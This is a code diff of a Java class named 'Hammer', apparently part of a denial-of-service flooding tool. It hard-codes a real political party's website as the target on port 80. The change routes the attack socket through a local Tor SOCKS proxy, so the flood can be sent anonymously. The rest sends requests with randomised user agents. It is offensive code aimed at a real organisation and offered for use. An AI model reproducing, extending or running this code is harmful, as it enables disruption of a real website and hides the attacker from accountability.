@@ -1,7 +1,10 @@
 package com.redpois0n.jammer;
 
 import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Proxy;
 import java.net.Socket;
+import java.net.SocketAddress;
 import java.util.Random;
 
 public class Hammer implements Runnable {
@@ -27,7 +30,12 @@ public class Hammer implements Runnable {
 	@Override
 	public void run() {
 		try {
-			Socket socket = new Socket("feministisktinitiativ.se", 80);
+			SocketAddress addr = new InetSocketAddress("127.0.0.1", 9050);
+			Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
+			Socket socket = new Socket(proxy);
+			InetSocketAddress dest = new InetSocketAddress("feministisktinitiativ.se", 80);
+			socket.connect(dest);
+			
 			OutputStream os = socket.getOutputStream();
 			
 			String useragent = getRandomUserAgent();
